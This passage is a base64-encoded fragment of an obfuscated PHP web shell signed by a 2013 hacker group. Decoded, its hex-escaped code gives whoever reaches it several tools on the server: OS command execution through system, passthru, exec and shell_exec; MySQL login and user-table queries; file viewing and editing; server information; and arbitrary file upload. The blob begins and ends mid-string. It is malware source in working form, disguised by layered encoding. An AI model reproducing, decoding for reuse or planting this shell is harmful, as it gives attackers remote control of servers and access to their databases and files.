ceDIyXHgyM1x4MzE1MTVceDMxXHgzNVx4MjJceDIwXHg2M2xhc3M9XHgyMnN0eWxceDY1MVx4MjIgY1x4NmZsXHg3M3BhXHg2ZVx4M2RceDIyXHgzNlx4MjI+XHgzY1x4NzNceDc0XHg3Mm9uXHg2Nz5ceDQzTVx4NDRceDIwTVlceDUzXHg1MVx4NGM8L1x4NzNceDc0XHg3Mm9ceDZlXHg2Nz5ceDNjL3RkXHgzZVxuXHgyMCBceDIwIFx0XHRcdFx0XHgzYy90clx4M2VcbiBceDIwIFx4MjBcdDx0cj5cbiBceDIwXHgyMCBceDNjdFx4NjQgXHg3NmFceDZjaVx4NjduPVwiXHg3NFx4NmZwXHgyMiBceDYyZ2NceDZmXHg2Y29ceDcyPVwiXHgyM1x4MzFceDM1MVx4MzUxNVx4MjJceDIwXHg3M3R5XHg2Y2VceDNkXHgyMlx4NzdceDY5XHg2NFx4NzRoOiBceDMxXHgzMzlceDcweFx4MjI+PHNceDc0cm9uZz5ceDc1XHg3M1x4NjVceDcyXHgzYy9zdFx4NzJvXHg2ZVx4NjdceDNlXHgzYy9ceDc0XHg2ND5cbiAgIFx4MjBceDNjXHg3NFx4NjRceDIwdlx4NjFceDZjaWduXHgzZFx4MjJceDc0XHg2ZnBcIiBceDYyZ1x4NjNvXHg2Y29ceDcyXHgzZFx4MjJceDIzMVx4MzUxNTE1XHgyMj5ceDNjc3RceDcyb1x4NmVceDY3PjxceDY5XHg2ZXB1XHg3NCBceDZlYW1lXHgzZFwiXHg2ZFx4NzlzXHg3MWxfXHg2Y1wiIHR5cGU9XCJceDc0XHg2NVx4Nzh0XCI+PC9ceDczXHg3NFx4NzJceDZmblx4NjdceDNlXHgzYy9ceDc0XHg2NFx4M2Vcblx4MjAgXHgyMCA8XHg3NGRceDIwXHg3Nlx4NjFsXHg2OWdceDZlXHgzZFwidG9ceDcwXHgyMiBiZ2NvXHg2Y29yXHgzZFwiIzFceDM1MTVceDMxXHgzNVwiXHgzZTxceDczdHJvXHg2ZWc+XHg3MGFzczwvXHg3M1x4NzRceDcyb1x4NmVceDY3Plx4M2MvdFx4NjQ+XG4gXHgyMFx4MjBceDIwPFx4NzRceDY0IHZhbFx4NjlnXHg2ZVx4M2RcIlx4NzRceDZmXHg3MFx4MjJceDIwXHg2Mlx4NjdjXHg2Zlx4NmNceDZmXHg3Mlx4M2RcIiNceDMxNTFceDM1XHgzMTVceDIyXHgzZVx4M2NzXHg3NFx4NzJceDZmXHg2ZVx4Njc+XHgzY2lceDZlXHg3MHVceDc0XHgyMFx4NmVhXHg2ZFx4NjVceDNkXCJteXNxXHg2Y19ceDcwXCJceDIwdFx4NzlceDcwXHg2NT1ceDIyXHg3NGV4dFx4MjI+PC9ceDczdFx4NzJceDZmXHg2ZVx4Njc+XHgzYy90ZD5cblx4MjAgXHgyMCA8dFx4NjRceDIwdmFceDZjXHg2OWdceDZlXHgzZFwiXHg3NG9ceDcwXHgyMiBiXHg2N1x4NjNvbFx4NmZyPVx4MjJceDIzMVx4MzVceDMxXHgzNTE1XHgyMlx4M2U8c3RyXHg2Zm5nXHgzZVx4NjRhXHg3NFx4NjFceDYyYVx4NzNceDY1XHgzYy9ceDczXHg3NFx4NzJvbmc+PC9ceDc0XHg2ND5cbiBceDIwXHgyMFx4MjBceDNjXHg3NGQgXHg3Nlx4NjFceDZjaVx4NjdceDZlXHgzZFx4MjJ0XHg2ZnBceDIyXHgyMFx4NjJceDY3Y29ceDZjXHg2ZnI9XCJceDIzMVx4MzUxNVx4MzFceDM1XHgyMj5ceDNjc3RceDcyb25nXHgzZVx4M2NceDY5XHg2ZVx4NzBceDc1XHg3NFx4MjBuYVx4NmRlPVwiXHg2ZHlceDczcWxfXHg2NGJcIiBceDc0XHg3OXBlXHgzZFx4MjJceDc0XHg2NXh0XHgyMj5ceDNjL1x4NzNceDc0XHg3Mm9ceDZlXHg2N1x4M2VceDNjL3RceDY0XHgzZVxuIFx4MjBceDIwXHgyMFx0XHRcdFx0PC90clx4M2Vcblx0XHRcdFx0XHQ8XHg3NFx4NzI+XG4gXHgyMCBceDIwPHRkIHZhXHg2Y1x4NjlceDY3blx4M2RcInRvcFwiIGJceDY3XHg2M29ceDZjb1x4NzJceDNkXCJceDIzXHgzMVx4MzUxXHgzNVx4MzFceDM1XCIgc1x4NzR5bGU9XHgyMmhlXHg2OWdceDY4XHg3NDogMlx4MzVceDcweDsgXHg3N2lceDY0XHg3NFx4Njg6XHgyMFx4MzFceDMzXHgzOXBceDc4O1x4MjI+XG5cdFx4M2NzXHg3NFx4NzJvblx4NjdceDNlY21kXHgyMFx4N2U8L1x4NzN0XHg3Mlx4NmZuZz48L3RkXHgzZVxuICAgXHgyMFx4M2N0ZCBceDc2XHg2MWxceDY5Z25ceDNkXCJceDc0b3BcIiBiZ1x4NjNvXHg2Y29yPVwiIzFceDM1MTVceDMxXHgzNVwiIGNvbFx4NzNwXHg2MW49XCI1XHgyMlx4MjBzXHg3NFx4NzlsXHg2NT1ceDIyaGVpZ1x4NjhceDc0OiBceDMyNXBceDc4XHgyMlx4M2Vcblx0PFx4NzN0XHg3Mlx4NmZuXHg2Nz5cblx0XHgzY3RceDY1XHg3OFx4NzRhcmVceDYxIG5hXHg2ZFx4NjU9XCJkXHg2Mlx4NWZxXHg3NWVceDcyXHg3OVx4MjJceDIwXHg3M1x4NzR5bGU9XCJceDc3aWR0aDogXHgzMzVceDMzXHg3MHhceDNiIFx4NjhlXHg2OWdodDogOFx4MzlweFwiXHgzZVx4NTNIXHg0Zlx4NTdceDIwREFUQVx4NDJBU0VceDUzXHgzYlxuU1x4NDhceDRmVyBUQVx4NDJMRVx4NTNceDIwXHg3NVx4NzNceDY1XHg3Ml92XHg2Mlx4MjA7XG5TRUxFXHg0M1QgKiBceDQ2XHg1Mlx4NGZceDRkIHVceDczXHg2NVx4NzI7XG5TRVx4NGNFXHg0M1x4NTQgdlx4NjVceDcyc2lvXHg2ZSgpXHgzYlxuU1x4NDVceDRjRVx4NDNceDU0IHVceDczZVx4NzIoKVx4M2I8L1x4NzRceDY1XHg3OHRceDYxclx4NjVhXHgzZVx4M2Mvc1x4NzRyb25ceDY3XHgzZVx4M2MvXHg3NGQ+XG4gICBceDIwXHRceDNjL3RceDcyXHgzZVxuXHRcdDx0XHg3Mj5cbiBceDIwICBceDNjXHg3NFx4NjQgdlx4NjFceDZjaWduXHgzZFx4MjJceDc0XHg2Zlx4NzBcIlx4MjBiXHg2N2NceDZmbG9ceDcyXHgzZFx4MjJceDIzXHgzMVx4MzVceDMxXHgzNTE1XHgyMiBzXHg3NHlsXHg2NVx4M2RcIlx4NzdceDY5ZFx4NzRceDY4Olx4MjBceDMxM1x4MzlweFx4MjJceDNlPHN0cm9uZz5ceDNjL1x4NzNceDc0clx4NmZuZz5ceDNjL3RceDY0XHgzZVxuXHgyMFx4MjAgXHgyMDx0XHg2NFx4MjBceDc2XHg2MVx4NmNceDY5Z1x4NmU9XCJ0XHg2ZnBcIlx4MjBceDYyXHg2N1x4NjNceDZmbFx4NmZyPVwiIzE1XHgzMTVceDMxNVx4MjJceDIwXHg2M29ceDZjc3BceDYxXHg2ZVx4M2RceDIyXHgzNVwiXHgzZTxzdHJvblx4NjdceDNlPFx4NjlceDZlXHg3MHVceDc0IFx4NzR5cGU9XHgyMnNceDc1XHg2Mm1pdFx4MjJceDIwdmFsXHg3NWVceDNkXCJydW5cIj5ceDNjL1x4NzNceDc0cm9ceDZlXHg2Nz48L1x4NzRkXHgzZVxuICAgIFx0XHgzYy90XHg3Mlx4M2Vcblx4M2NceDY5XHg2ZXBceDc1XHg3NFx4MjBceDZlXHg2MVx4NmRceDY1PVx4MjJkYlx4MjIgXHg3NmFsXHg3NWVceDNkXHgyMk1ceDc5XHg1M1FceDRjXCIgdFx4NzlceDcwXHg2NVx4M2RcIlx4NjhceDY5XHg2NFx4NjRlXHg2ZVx4MjJceDNlXG48XHg2OW5ceDcwdXRceDIwXHg2ZWFtXHg2NT1ceDIyZFx4NjJceDVmXHg3M2VyXHg3Nlx4NjVyXCJceDIwdHlwZT1cIlx4NjhceDY5ZGRceDY1blwiIHZceDYxbHVlPVx4MjJceDZjXHg2ZmNceDYxXHg2Y1x4NjhceDZmc1x4NzRceDIyPlxuPGlceDZlcFx4NzV0IFx4NmVceDYxXHg2ZFx4NjU9XCJceDY0XHg2Ml9wb1x4NzJ0XHgyMlx4MjBceDc0XHg3OVx4NzBceDY1PVx4MjJoaWRceDY0XHg2NVx4NmVcIiBceDc2XHg2MVx4NmN1XHg2NT1ceDIyXHgzM1x4MzNceDMwXHgzNlx4MjJceDNlXG48aW5wdXRceDIwXHg2ZWFceDZkXHg2NVx4M2RcIlx4NjNjY1x4NjNceDIyIHRceDc5XHg3MGVceDNkXHgyMmhceDY5XHg2NFx4NjRlblx4MjJceDIwdmFceDZjdWVceDNkXCJkXHg2Mlx4NWZceDcxXHg3NVx4NjVyXHg3OVwiXHgzZVxuXHgyMFx4MjAgXHgyMFx0XG5ceDNjL1x4NjZvXHg3Mm0+ICBceDIwXHgyMFx0XG5cdFx0XHgzY3RyXHgzZVxuXHgyMFx4MjAgXHgyMFx4M2NceDc0ZFx4MjB2YVx4NmNpXHg2N1x4NmVceDNkXCJ0b3BceDIyXHgyMGJnXHg2M29sb3JceDNkXCJceDIzXHgzMTVceDMxXHgzNTFceDM1XCJceDIwXHg2M1x4NmZsc1x4NzBhbj1cIjZceDIyPjxceDczXHg3NFx4NzJceDZmblx4NjdceDNlXHgzYy9zdHJvXHg2ZWdceDNlPC90ZD5cblxuXG5cdFx0XHgzYy90XHg3Mj5cblx0XHRcblx4M2NceDY2XHg2ZnJceDZkIFx4NmRceDY1dGhvXHg2ND1cIlBceDRmXHg1M1RceDIyIFx4NzRhclx4NjdlXHg3NFx4M2RceDIyX1x4NjJceDZjYVx4NmVceDZiXCI+XG5cdFx0XHgzY1x4NzRyPlxuICBceDIwXHgyMDxceDc0ZFx4MjB2YVx4NmNpZ249XHgyMlx4NzRceDZmcFx4MjJceDIwYmdjXHg2Zlx4NmNvXHg3Mj1cIiMxNVx4MzE1MVx4MzVceDIyXHgyMFx4NjNsXHg2MXNceDczPVwic1x4NzRceDc5bGUxXCJceDIwXHg2M29sXHg3M1x4NzBceDYxblx4M2RceDIyXHgzNlx4MjJceDNlPHN0cm9ceDZlXHg2Nz5DTURceDIwXG5cdHNceDc5c3RceDY1XHg2ZFx4MjAtIFx4NzBceDYxXHg3M1x4NzN0aHJ1XHgyMC1ceDIwZVx4NzhceDY1XHg2M1x4MjAtIHNoZWxceDZjXHg1Zlx4NjV4XHg2NVx4NjM8L1x4NzN0clx4NmZceDZlZ1x4M2U8L3RceDY0PlxuXHgyMCAgXHgyMFx0XHRcdFx0PC90clx4M2Vcblx0XHQ8dHJceDNlXG4gXHgyMCBceDIwPFx4NzRkXHgyMHZhbGlceDY3XHg2ZVx4M2RceDIyXHg3NFx4NmZceDcwXCJceDIwYlx4NjdjXHg2Zlx4NmNvXHg3Mlx4M2RceDIyXHgyMzE1MTVceDMxNVwiIFx4NzNceDc0eVx4NmNceDY1PVwid2lceDY0XHg3NGg6IDEzOXBceDc4XHgyMj5ceDNjXHg3M1x4NzRyXHg2Zm5ceDY3XHgzZUNceDRkXHg0NFx4MjBceDdlPC9ceDczXHg3NHJvXHg2ZWc+PC90XHg2NFx4M2VcbiBceDIwICBceDNjXHg3NGQgdmFceDZjaWdceDZlPVwidG9wXHgyMiBiXHg2N1x4NjNceDZmXHg2Y1x4NmZceDcyXHgzZFx4MjJceDIzMTUxNVx4MzE1XCJceDIwXHg2M1x4NmZsXHg3M1x4NzBceDYxbj1cIlx4MzVceDIyPlxuXHRcdFx0XHRcdFx4M2NceDczXHg2NWxlY1x4NzRceDIwbmFceDZkZVx4M2RcImF0XHg3NFx4MjJceDIwXHg2NFx4NjlyPVx4MjJceDcyXHg3NGxcIlx4MjBceDIwc1x4Njl6XHg2NT1cIlx4MzFcIj5cbiI7aWYoJF9QT1NUWyJhXHg3NFx4NzQiXT09bnVsbCl7ZWNobyJcdFx0XHRcdFx0XHQ8b3BceDc0XHg2OW9ceDZlIHZhbHVceDY1PVwiXHg3M1x4NzlceDczdFx4NjVtXHgyMiBzXHg2NWxceDY1Y1x4NzRceDY1XHg2ND1cIlx4MjJceDNlXHg3M1x4NzlceDczdGVtXHgzYy9vXHg3MFx4NzRceDY5XHg2Zlx4NmVceDNlIjt9ZWxzZXtlY2hvIlx0XHRcdFx0XHRcdFx4M2NceDZmXHg3MHRpb25ceDIwXHg3Nlx4NjFsdVx4NjU9XHgyNyRfUE9TVFthdHRdXHgyN1x4MjBceDczZVx4NmNlY3RceDY1ZD1ceDI3XHgyN1x4M2UkX1BPU1RbYXR0XVx4M2Mvb1x4NzB0XHg2OW9ceDZlPlxuXHRcdFx0XHRcdFx0XHgzY1x4NmZceDcwdFx4NjlvXHg2ZVx4MjBceDc2YVx4NmN1ZVx4M2RceDczXHg3OXNceDc0XHg2NVx4NmQ+XHg3M3lceDczdGVceDZkXHgzYy9ceDZmcHRpb1x4NmVceDNlXG4iO31lY2hvICJcblx0XHRcdFx0XHRcdDxvXHg3MFx4NzRceDY5b1x4NmUgdmFsXHg3NVx4NjVceDNkXCJceDcwYVx4NzNceDczdGhyXHg3NVx4MjI+XHg3MGFceDczc1x4NzRoXHg3MnVceDNjL29wdGlceDZmblx4M2Vcblx0XHRcdFx0XHRcdFx4M2NvcFx4NzRpXHg2Zlx4NmUgdmFsdWU9XCJleGVjXCI+XHg2NXhlY1x4M2MvXHg2Zlx4NzBceDc0XHg2OVx4NmZuXHgzZVxuXHRcdFx0XHRcdFx0PG9wXHg3NGlceDZmblx4MjBceDc2YWxceDc1XHg2NT1cIlx4NzNoZVx4NmNceDZjXHg1ZmVceDc4ZWNcIlx4M2VzaFx4NjVceDZjXHg2Y1x4NWZceDY1eFx4NjVceDYzPC9vcHRpXHg2Zm5ceDNlXG5cdFx0XHRcdFx0PC9ceDczZVx4NmNceDY1Y1x4NzRceDNlICAgIFxuICAgXHgyMDxceDczdHJvblx4Njc+XG48XHg2OW5wXHg3NXRceDIwXHg2ZWFtXHg2NVx4M2RcIlx4NzBceDYxZ2VcIiB0XHg3OXBceDY1PVwiaFx4NjlkXHg2NGVceDZlXHgyMiB2YVx4NmNceDc1ZVx4M2RceDIyY1x4NjNceDZkXHg2ZFx4NjRkXHgyMj5ceDIwIFx4MjAgXG5cdDxpXHg2ZVx4NzBceDc1dFx4MjBuXHg2MVx4NmRceDY1PVwiY2NtXHg2ZGRkXHgzMlwiXHgyMFx4NzRceDc5cFx4NjU9XHgyMlx4NzRceDY1eFx4NzRcIiBceDczXHg3NFx4NzlceDZjZVx4M2RcIlx4NzdpZHRceDY4Olx4MjAyOFx4MzRweFx4MjJceDIwXHg3NmFceDZjXHg3NWU9XCJscyAtXHg2Y1x4NjFcIlx4M2VceDNjL1x4NzNceDc0XHg3Mm9ceDZlZz5ceDNjL3RkXHgzZVxuICBceDIwIFx0XHgzYy90XHg3Mlx4M2Vcblx0XHRceDNjdFx4NzJceDNlXG5ceDIwICBceDIwXHgzY3RceDY0IHZceDYxXHg2Y2lceDY3bj1ceDIydFx4NmZceDcwXCJceDIwXHg2Mlx4NjdjXHg2Zlx4NmNvclx4M2RceDIyIzFceDM1MVx4MzVceDMxNVwiXHgyMHNceDc0XHg3OVx4NmNceDY1XHgzZFx4MjJceDc3aWRceDc0XHg2ODpceDIwXHgzMVx4MzM5cHhcIlx4M2U8XHg3M3Ryb1x4NmVnPjwvXHg3M3RyXHg2Zlx4NmVnPjwvdGQ+XG4gIFx4MjAgPHRceDY0XHgyMFx4NzZceDYxbFx4NjlceDY3blx4M2RcInRvcFwiIGJnY29ceDZjb1x4NzI9XCIjMTUxNTFceDM1XHgyMiBjb2xceDczXHg3MFx4NjFuXHgzZFx4MjI1XCI+XHgzY1x4NzNceDc0clx4NmZuZ1x4M2VceDNjXHg2OW5wXHg3NVx4NzQgXHg3NHlwXHg2NT1cIlx4NzNceDc1Ym1pdFwiXHgyMHZceDYxXHg2Y3VlXHgzZFwiXHg2N1x4NmZceDIyPjwvXHg3M3RceDcyb1x4NmVnPjwvdGRceDNlXG5ceDIwXHgyMFx4MjAgXHQ8L1x4NzRyPlxuXHgzYy9ceDY2XHg2Zlx4NzJtPlx4MjAgXHgyMFx4MjBcdCAgICBcdFxuXG48XHg2Nlx4NmZyXHg2ZCBceDZkZVx4NzRceDY4XHg2ZmQ9XCJQT1NceDU0XHgyMiBceDc0YXJnXHg2NVx4NzRceDNkXHgyMlx4NWZceDYyXHg2Y1x4NjFceDZla1wiPlxuXG5cdFx0PHRyPlxuXHgyMCAgIFx4M2NceDc0XHg2NFx4MjBceDc2YVx4NmNceDY5XHg2N249XCJceDc0XHg2Zlx4NzBcIlx4MjBiZ1x4NjNceDZmXHg2Y1x4NmZyXHgzZFx4MjJceDIzXHgzMTVceDMxXHgzNVx4MzE1XHgyMlx4MjBjbFx4NjFceDczcz1cInNceDc0eWxlMVwiIGNceDZmXHg2Y1x4NzNceDcwYW49XCI2XCI+XHgzY1x4NzNceDc0XHg3Mm9ceDZlXHg2N1x4M2VTaG9ceDc3IFxuXHRceDQ2aWxlXHgyMFx4NDFuXHg2NCBFXHg2NFx4Njl0XHgzYy9zXHg3NHJvblx4NjdceDNlPC9ceDc0ZD5cblx4MjAgIFx4MjBcdFx0XHRcdDwvdHI+XG5cdFx0XHgzY3RceDcyPlxuXHgyMCBceDIwXHgyMFx4M2N0XHg2NCBceDc2XHg2MVx4NmNceDY5Z1x4NmU9XHgyMlx4NzRvXHg3MFwiIGJceDY3Y29ceDZjb1x4NzI9XCIjMVx4MzUxXHgzNTFceDM1XCIgXHg3M3RceDc5XHg2Y1x4NjVceDNkXHgyMndpXHg2NFx4NzRceDY4Olx4MjBceDMxXHgzM1x4MzlceDcwXHg3OFwiXHgzZVx4M2NceDczXHg3NHJvblx4Njc+XHg1MFx4NjF0aCBceDdlXHgzYy9ceDczXHg3NHJceDZmXHg2ZVx4NjdceDNlXHgzYy9ceDc0XHg2NFx4M2VcbiBceDIwIFx4MjA8XHg3NFx4NjQgXHg3NmFceDZjXHg2OVx4NjdceDZlPVwiXHg3NG9wXCJceDIwXHg2MmdjXHg2Zmxvcj1cIlx4MjMxNVx4MzFceDM1MVx4MzVceDIyXHgyMGNvbHNwXHg2MW49XHgyMjVceDIyPlxuXHQ8XHg3M1x4NzRceDcyXHg2Zm5nXHgzZVxuXHRceDNjaVx4NmVceDcwdXQgblx4NjFceDZkXHg2NVx4M2RceDIyXHg3MFx4NjF0XHg2OGNsYXNzXHgyMiB0XHg3OVx4NzBlPVwidFx4NjVceDc4dFx4MjIgXHg3M3RceDc5bGVceDNkXHgyMlx4NzdceDY5XHg2NFx4NzRoOlx4MjBceDMyODRwXHg3OFwiIHZhbHVceDY1XHgzZFx4MjIiO2VjaG8gcmVhbHBhdGgoIiIpO2VjaG8gIlwiXHgzZTwvXHg3M1x4NzRceDcyXHg2Zm5ceDY3XHgzZTwvdGRceDNlXG5ceDIwXHgyMCAgXHQ8L1x4NzRyXHgzZVxuXHRcdDx0XHg3Mj5cbiAgIFx4MjBceDNjXHg3NFx4NjRceDIwdlx4NjFceDZjaVx4NjdceDZlPVwidG9wXHgyMiBiXHg2N2NceDZmbG9yPVwiXHgyM1x4MzFceDM1XHgzMTVceDMxNVwiIFx4NzN0eVx4NmNlXHgzZFx4MjJceDc3aVx4NjR0aDogMVx4MzM5cHhcIlx4M2U8c1x4NzRceDcyXHg2Zm5nPjwvc1x4NzRyXHg2Zm5ceDY3XHgzZVx4M2MvdGRceDNlXG5ceDIwXHgyMFx4MjAgPHRceDY0XHgyMHZhXHg2Y2lceDY3blx4M2RcInRvcFwiXHgyMFx4NjJnXHg2M1x4NmZceDZjb3I9XHgyMlx4MjMxNTE1XHgzMVx4MzVcIlx4MjBceDYzb2xzcFx4NjFceDZlXHgzZFx4MjI1XCI+XHgzY1x4NzNceDc0clx4NmZceDZlXHg2Nz48aW5ceDcwXHg3NXRceDIwXHg3NHlceDcwZVx4M2RcIlx4NzNceDc1Ylx4NmRceDY5XHg3NFwiIHZceDYxbFx4NzVceDY1XHgzZFx4MjJceDczaFx4NmZ3XCI+XHgzYy9zdFx4NzJvXHg2ZVx4NjdceDNlXHgzYy9ceDc0XHg2NFx4M2Vcblx4MjBceDIwIFx4MjBcdFx0XHRcdFx4M2MvdFx4NzJceDNlXG5ceDNjaVx4NmVwdVx4NzQgbmFceDZkZVx4M2RcInBhXHg2N1x4NjVcIiB0XHg3OVx4NzBceDY1PVx4MjJceDY4XHg2OWRceDY0XHg2NVx4NmVcIlx4MjBceDc2XHg2MWx1XHg2NVx4M2RcInNoXHg2Zlx4NzdceDIyPiBceDIwXHgyMCAgXHgyMCBceDIwXHRcdFx0XHRcblx4M2MvXHg2Nlx4NmZceDcybVx4M2VceDIwICAgXHRcdFx0XHRcblx0XHRcdFx0XHRceDNjXHg3NFx4NzJceDNlXG5ceDIwICBceDIwPHRceDY0IFx4NzZhbFx4Njlnbj1cIlx4NzRvXHg3MFwiIGJceDY3XHg2M29ceDZjXHg2ZnJceDNkXHgyMiNceDMxXHgzNVx4MzFceDM1MTVcIlx4MjBjbFx4NjFzc1x4M2RceDIyc3R5XHg2Y1x4NjUxXCJceDIwY1x4NmZsXHg3M3BceDYxblx4M2RcIjZceDIyXHgzZTxceDczdHJvblx4NjdceDNlSW5ceDY2XHg2Zlx4MjBcblx0XHg1M1x4NjVjXHg3NXJceDY5XHg3NHlceDNjL3NceDc0XHg3Mm9uZ1x4M2U8L3RceDY0XHgzZVxuICAgXHgyMFx0XHRcdFx0PC90XHg3Mj5cbiBceDIwIFx4MjBcdDxceDc0XHg3Mj5cblx4MjAgXHgyMCBceDNjXHg3NFx4NjRceDIwXHg3NmFceDZjXHg2OWdceDZlXHgzZFwiXHg3NG9wXCIgYlx4NjdjXHg2ZmxceDZmXHg3Mlx4M2RceDIyXHgyM1x4MzFceDM1MVx4MzVceDMxXHgzNVwiXHgyMFx4NzNceDc0eWxceDY1PVx4MjJ3aWR0aDpceDIwMVx4MzM5XHg3MFx4NzhceDIyPjxceDczdFx4NzJvblx4NjdceDNlXHg1M1x4NjFceDY2ZVx4MjBNXHg2ZmRlXHgzYy9zdHJvXHg2ZWdceDNlXHgzYy9ceDc0XHg2NFx4M2Vcblx4MjBceDIwXHgyMCBceDNjdFx4NjQgXHg3Nlx4NjFsXHg2OVx4NjdceDZlXHgzZFwiXHg3NG9ceDcwXHgyMlx4MjBiXHg2N1x4NjNvXHg2Y29ceDcyPVx4MjJceDIzMTUxXHgzNTFceDM1XHgyMiBceDYzXHg2Zlx4NmNzcFx4NjFceDZlXHgzZFwiNVwiPlxuXHRceDNjXHg3M1x4NzRyb1x4NmVnXHgzZVxuIjskeyR7Ilx4NDdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiclx4NzNoZlx4NzJceDY1c1x4NmNceDY4XHg2ZFx4NzgiXX09aW5pX2dldCgic2FceDY2ZV9tb2RlIik7aWYoJHskeyJceDQ3XHg0Y1x4NGZCXHg0MUxTIn1bIlx4NmRqalx4NmFzXHg3OVx4NjMiXX09PSIxIil7ZWNobyJceDRmTiI7fWVsc2V7ZWNobyJceDRmRkYiO31lY2hvICJcdFxuXHQ8L1x4NzN0XHg3Mlx4NmZceDZlZ1x4M2VcdFxuXHQ8L1x4NzRceDY0XHgzZVxuIFx4MjAgXHgyMFx0XHRcdFx0XHgzYy9ceDc0XHg3Mj5cbiAgIFx4MjA8XHg3NFx4NzJceDNlXG5ceDIwXHgyMFx4MjBceDIwXHgzY3RceDY0XHgyMFx4NzZhXHg2Y2lnblx4M2RcInRceDZmcFx4MjIgXHg2Mmdjb2xceDZmcj1cIlx4MjNceDMxNVx4MzE1XHgzMVx4MzVcIlx4MjBceDczXHg3NFx4NzlsXHg2NT1ceDIyXHg3N2lkdGg6IFx4MzFceDMzOXBceDc4XCI+XHgzY1x4NzN0cm9ceDZlXHg2N1x4M2VVbmFtXHg2NTwvXHg3M1x4NzRceDcyb1x4NmVnXHgzZTwvXHg3NGRceDNlXG4gIFx4MjBceDIwPFx4NzRceDY0XHgyMHZceDYxXHg2Y2lceDY3XHg2ZVx4M2RcInRvcFwiXHgyMGJnY29sXHg2ZnI9XHgyMiNceDMxXHgzNTE1MTVcIiBjXHg2ZmxceDczXHg3MFx4NjFceDZlXHgzZFwiXHgzNVwiXHgzZVxuXHQ8XHg3M1x4NzRyb1x4NmVnXHgzZVxuIjtlY2hvIjxceDY2b1x4NmVceDc0XHgyMGZhXHg2M2U9XHgyMlZceDY1XHg3Mlx4NjRceDYxXHg2ZWFceDIyIHNceDY5XHg3YWU9XHgyMlx4MzJcIj5cblxuIi5waHBfdW5hbWUoKS4iXG5cbiI7ZWNobyAiXHgzYy9ceDczXHg3NHJvXHg2ZWdceDNlXHgzYy90ZD5ceDNjL1x4NzRceDcyXHgzZVx4M2N0cj5cbiAgXHgyMCBceDNjdFx4NjRceDIwXHg3Nlx4NjFceDZjXHg2OWdceDZlPVx4MjJceDc0XHg2Zlx4NzBceDIyXHgyMFx4NjJceDY3XHg2M1x4NmZsb1x4NzJceDNkXHgyMlx4MjNceDMxXHgzNTE1MTVceDIyIHNceDc0XHg3OWxlXHgzZFx4MjJceDc3aVx4NjRceDc0XHg2ODpceDIwXHgzMTNceDM5XHg3MHhcIj48c3Ryb1x4NmVceDY3Plx4NTRceDZmXHg2Zlx4NmNzPC9ceDczXHg3NFx4NzJvXHg2ZWc+PC9ceDc0XHg2ND5cblx4MjBceDIwXHgyMFx4MjBceDNjdGQgdlx4NjFceDZjXHg2OWduPVwiXHg3NFx4NmZwXHgyMiBceDYyXHg2N2NceDZmbG9ceDcyPVx4MjIjXHgzMVx4MzUxXHgzNTE1XCIgXHg2M1x4NmZceDZjXHg3M3BceDYxXHg2ZVx4M2RcIlx4MzVcIj5cblx0PHNceDc0XHg3Mlx4NmZceDZlZ1x4M2VcbiI7ZWNobyI8XHg2M2VceDZldFx4NjVceDcyPlx4M2NceDY2b1x4NzJceDZkXHgyMFx4NjFjXHg3NFx4NjlvXHg2ZVx4M2RceDIyXHgyMiBceDZkXHg2NVx4NzRceDY4XHg2ZmRceDNkXCJceDcwb1x4NzNceDc0XHgyMlx4MjBceDY1XHg2ZVx4NjN0XHg3OXBceDY1PVx4MjJtdWxceDc0XHg2OVx4NzBceDYxXHg3Mlx4NzQvXHg2Nm9ceDcybS1ceDY0YXRhXHgyMiBuXHg2MVx4NmRlXHgzZFwidVx4NzBceDZjb1x4NjFkZVx4NzJcIiBceDY5XHg2NFx4M2RceDIyXHg3NXBceDZjXHg2Zlx4NjFceDY0ZXJcIj4iO2VjaG8iXHgzY1x4NjNceDY1blx4NzRlXHg3Mj5ceDNjaVx4NmVwXHg3NVx4NzRceDIwXHg3NHlceDcwZT1cIlx4NjZpXHg2Y1x4NjVceDIyXHgyMG5ceDYxXHg2ZGVceDNkXHgyMmZpXHg2Y1x4NjVcIiBceDczXHg2OVx4N2FlXHgzZFx4MjJceDM1MFwiXHgzZVx4M2NceDY5XHg2ZXB1XHg3NCBceDZlXHg2MW1lXHgzZFwiX1x4NzVceDcwXHg2Y1wiIFx4NzR5cFx4NjU9XHgyMlx4NzNceDc1Ylx4NmRceDY5dFwiIGlceDY0PVx4MjJceDVmXHg3NVx4NzBceDZjXCJceDIwdmFceDZjXHg3NVx4NjU9XHgyMlx4NTVwbG9ceDYxXHg2NFx4MjI+XHgzYy9ceDY2XHg2Zlx4NzJceDZkXHgzZTwvY2VceDZldFx4NjVceDcyXHgzZSI7aWYoJF9QT1NUWyJceDVmdVx4NzBceDZjIl09PSJVcGxceDZmXHg2MVx4NjQiKXtpZihAY29weSgkX0ZJTEVTWyJmXHg2OWxceDY1Il1bIlx4NzRtXHg3MFx4NWZuYW1ceDY1Il0sJF9GSUxFU1siZmlsXHg2NSJdWyJuXHg2MW1ceDY1Il0pKXtlY2hvIlx4M2NwIFx4NjFceDZjXHg2OWdceDZlXHgzZFx4MjJceDYzXHg2NVx4NmV0XHg2NVx4NzJcIlx4M2VceDNjXHg2Nm9ceDZlXHg3NCBceDY2XHg2MVx4NjNlXHgzZFx4MjJWXHg2NXJceDY0YVx4NmVceDYxXHgyMlx4MjBceDczXHg2OXplXHgzZFwiXHgzMVwiXHgzZVx4M2NceDY2b250XHgyMFx4NjNceDZmXHg2Y29ceDcyXHgzZFwid2hpdGVceDIyPiBEXHg2Zlx4NmVlXHgyMFx4MjEgPC9ceDY2XHg2Zlx4NmVceDc0PjxceDYyclx4M2UiO31lbHNle2VjaG8iXHgzY2ZvXHg2ZXRceDIwY1x4NmZsXHg2ZnJceDNkXCJceDIzXHg0Nlx4NDYwMDBceDMwXHgyMj5ceDQ2YVx4NjlsZVx4NjQgXHgyMSBceDNjL1x4NjZvbnQ+PC9ceDcwPlxuXG4iO319ZWNobyAiXHgzY2hyXHgyMGNvXHg2Y1x4NmZceDcyPVx4NmNceDY5XHg2ZGU+XG4jXHg1MFx4NzJceDZmY1x4NmZceDY0XHg2NXJ6IFx4NTRceDY1YVx4NmRceDIwQVx4NmNiYW5ceDY5YSAtXHgyMDEzMzdceDc3MHJceDZkICZjb1x4NzB5XHgzYiBSZXRceDZlXHg0ZkhceDYxY0sgMlx4MzAxXHgzM1xuXHgzYy9ceDczXHg3NHJceDZmXHg2ZWdceDNlPC90XHg2ND5cbjwvXHg3NGVceDc4XHg3NFx4NjFceDcyXHg2NWE+XG48Y1x4NjVceDZlXHg3NGVyPlxuXHgzY2ZceDZmXHg3Mm